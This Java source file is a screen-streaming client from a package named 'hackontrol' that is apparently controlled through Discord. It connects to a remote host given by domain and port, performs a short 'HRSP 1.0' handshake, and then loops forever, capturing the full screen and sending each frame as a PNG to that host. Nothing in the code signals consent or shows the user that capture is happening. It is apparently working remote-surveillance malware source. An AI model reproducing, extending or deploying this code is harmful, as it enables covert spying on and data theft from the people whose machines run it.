package com.khopan.hackontrol.hrsp;

import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.function.Consumer;

import javax.imageio.ImageIO;

import com.khopan.hackontrol.utils.HackontrolError;
import com.khopan.hackontrol.utils.interaction.HackontrolButton;
import com.khopan.hackontrol.utils.sendable.sender.ConsumerMessageCreateDataSendable;

import net.dv8tion.jda.api.utils.messages.MessageCreateBuilder;
import net.dv8tion.jda.api.utils.messages.MessageCreateData;

public class HRSPClient {
	public HRSPClient(String domainName, int port, Consumer<MessageCreateData> consumer) throws Throwable {
		Socket socket = new Socket(domainName, port);
		OutputStream outputStream = socket.getOutputStream();
		outputStream.write("HRSP 1.0 CONNECT".getBytes(StandardCharsets.UTF_8));
		outputStream.flush();
		InputStream inputStream = socket.getInputStream();
		String response = new String(inputStream.readNBytes(11), StandardCharsets.UTF_8);

		if(!"HRSP 1.0 OK".equals(response)) {
			HackontrolError.message(ConsumerMessageCreateDataSendable.of(consumer), "Invalid response: " + response);
			socket.close();
			return;
		}

		consumer.accept(new MessageCreateBuilder().setContent("**Connected**").addActionRow(HackontrolButton.delete()).build());
		Robot robot = new Robot();
		Rectangle bounds = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());

		while(true) {
			BufferedImage image = robot.createScreenCapture(bounds);
			ByteArrayOutputStream stream = new ByteArrayOutputStream();
			ImageIO.write(image, "png", stream);
			byte[] data = stream.toByteArray();
			outputStream.write((data.length >> 24) & 0xFF);
			outputStream.write((data.length >> 16) & 0xFF);
			outputStream.write((data.length >> 8) & 0xFF);
			outputStream.write(data.length & 0xFF);
			outputStream.write(data);
			outputStream.flush();
		}
	}
}
